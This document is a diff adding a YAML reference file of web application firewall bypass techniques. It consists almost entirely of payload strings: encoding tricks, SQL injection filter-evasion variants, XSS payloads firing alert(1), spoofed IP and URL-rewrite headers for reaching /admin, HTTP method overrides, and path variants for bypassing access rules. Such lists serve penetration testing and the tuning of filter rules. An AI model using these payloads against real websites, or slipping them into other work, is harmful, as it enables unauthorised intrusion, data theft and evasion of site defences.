@@ -1,0 +1,116 @@
+# WAF Bypass Techniques
+
+encoding:
+  url:
+    single: {from: "'", to: "%27"}
+    double: {from: "'", to: "%2527"}
+
+  unicode:
+    - {from: "'", to: "%u0027"}
+    - {from: "<", to: "%u003c"}
+    - {from: "/", to: "%u002f"}
+
+  html_entities:
+    - {from: "'", to: "&#39;"}
+    - {from: "<", to: "&#60;"}
+    - {from: ">", to: "&#62;"}
+    - {from: "'", to: "&#x27;"}
+    - {from: "<", to: "&#x3c;"}
+
+  overlong_utf8:
+    - {from: "'", to: "%c0%a7"}
+    - {from: "/", to: "%c0%af"}
+
+sqli_bypass:
+  comment_variants:
+    - "/**/SELECT/**/1"
+    - "/*!SELECT*/ 1"
+    - "SELECT%0a1"
+    - "SELECT%0d%0a1"
+    - "SELECT%091"
+
+  case_mutation:
+    - "SeLeCt"
+    - "sElEcT"
+    - "UNION%20ALL%20SELECT"
+
+  keyword_replacement:
+    - {blocked: "UNION SELECT", bypass: "UNION ALL SELECT"}
+    - {blocked: "SELECT", bypass: "SEL%00ECT"}
+    - {blocked: "OR 1=1", bypass: "OR 2>1"}
+    - {blocked: "AND", bypass: "&&"}
+    - {blocked: "OR", bypass: "||"}
+    - {blocked: "SLEEP", bypass: "BENCHMARK(10000000,SHA1('a'))"}
+
+  function_alternatives:
+    - {blocked: "CONCAT()", bypass: "CONCAT_WS()"}
+    - {blocked: "GROUP_CONCAT()", bypass: "string_agg() (PostgreSQL)"}
+    - {blocked: "SUBSTRING()", bypass: "MID() or SUBSTR()"}
+
+xss_bypass:
+  tag_variants:
+    - '<img src=x onerror="alert(1)">'
+    - '<svg onload=alert(1)>'
+    - '<body onload=alert(1)>'
+    - '<details open ontoggle=alert(1)>'
+    - '<marquee onstart=alert(1)>'
+    - '<video onerror=alert(1)><source>'
+    - '<audio onerror=alert(1)><source>'
+    - '<input onfocus=alert(1) autofocus>'
+    - '<select onfocus=alert(1) autofocus>'
+    - '<textarea onfocus=alert(1) autofocus>'
+
+  case_tricks:
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<SCRIPT>alert(1)</SCRIPT>"
+    - "<scr<script>ipt>alert(1)</scr</script>ipt>"
+
+  encoding_tricks:
+    - "<script>alert&#40;1&#41;</script>"
+    - "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>"
+    - "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"
+
+  javascript_uri:
+    - "javascript:alert(1)"
+    - "jAvAsCrIpT:alert(1)"
+    - "java%0ascript:alert(1)"
+    - "java%0dscript:alert(1)"
+    - "java%09script:alert(1)"
+
+http_techniques:
+  chunked_transfer:
+    description: "Split payload across HTTP chunks"
+    method: "Transfer-Encoding: chunked"
+
+  multipart_boundary:
+    description: "Hide payload in multipart form data"
+    method: "Content-Type: multipart/form-data; boundary=---"
+
+  header_injection:
+    - "X-Forwarded-For: 127.0.0.1"
+    - "X-Real-IP: 127.0.0.1"
+    - "X-Originating-IP: 127.0.0.1"
+    - "X-Custom-IP-Authorization: 127.0.0.1"
+    - "X-Original-URL: /admin"
+    - "X-Rewrite-URL: /admin"
+
+  method_override:
+    - "X-HTTP-Method-Override: PUT"
+    - "X-HTTP-Method: DELETE"
+    - "X-Method-Override: PATCH"
+
+  content_type:
+    - "application/json instead of application/x-www-form-urlencoded"
+    - "text/xml instead of application/json"
+    - "multipart/form-data instead of application/json"
+
+path_traversal:
+  - "/admin → /ADMIN"
+  - "/admin → /admin/"
+  - "/admin → /admin/."
+  - "/admin → //admin"
+  - "/admin → /./admin"
+  - "/admin → /admin%20"
+  - "/admin → /admin%09"
+  - "/admin → /admin..;/"
+  - "/admin → /%61dmin"
